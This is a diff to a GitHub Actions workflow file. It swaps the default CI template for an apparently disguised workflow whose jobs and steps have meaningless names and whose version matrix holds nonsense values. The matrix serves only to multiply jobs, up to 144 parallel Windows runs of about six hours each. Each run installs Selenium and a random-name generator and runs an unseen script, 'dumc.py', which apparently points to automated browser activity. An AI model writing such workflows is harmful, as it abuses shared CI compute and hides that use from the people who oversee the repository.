@@ -1,36 +1,57 @@
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the workflow will run
+name: rng_gozco
+# on: [push]
 on:
-  # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-
-# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+      
 jobs:
-  # This workflow contains a single job called "build"
-  build:
-    # The type of runner that the job will run on
-    runs-on: ubuntu-latest
-
-    # Steps represent a sequence of tasks that will be executed as part of the job
+  pn:
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        go: [1.1, 10]
+        flag: [A, B]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
-      - uses: actions/checkout@v3
-
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+    - name: S o ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Spv
+      uses: actions/checkout@v1
+    - name: rr_go
+      run: |
+        sudo apt update -y && sleep 7
+        
+  win-1:
+    needs: pn
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         go: [1.1, 1.d2, 1.1c3, 1.1c4, 1.1q5, 1.16o, 1.17s, 1.18s, 1.1w9]
+         flag: [kmn, oiu, qcwe, nvb, lpd, scds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
+    timeout-minutes: 355
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: stg2o ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Stg3
+      uses: actions/checkout@v1
+    - name: finish
+      run: |
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        python3 dumc.py   
